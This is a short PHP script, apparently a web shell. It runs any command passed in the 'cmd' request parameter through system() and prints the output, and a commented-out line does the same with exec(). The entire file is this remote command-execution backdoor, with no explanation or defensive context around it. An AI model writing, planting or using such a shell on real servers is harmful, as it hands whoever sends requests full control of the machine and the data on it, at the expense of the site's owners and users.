<?php if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
//       	 print_r(exec($cmd));
//
		print_r(system($cmd));
}
?>

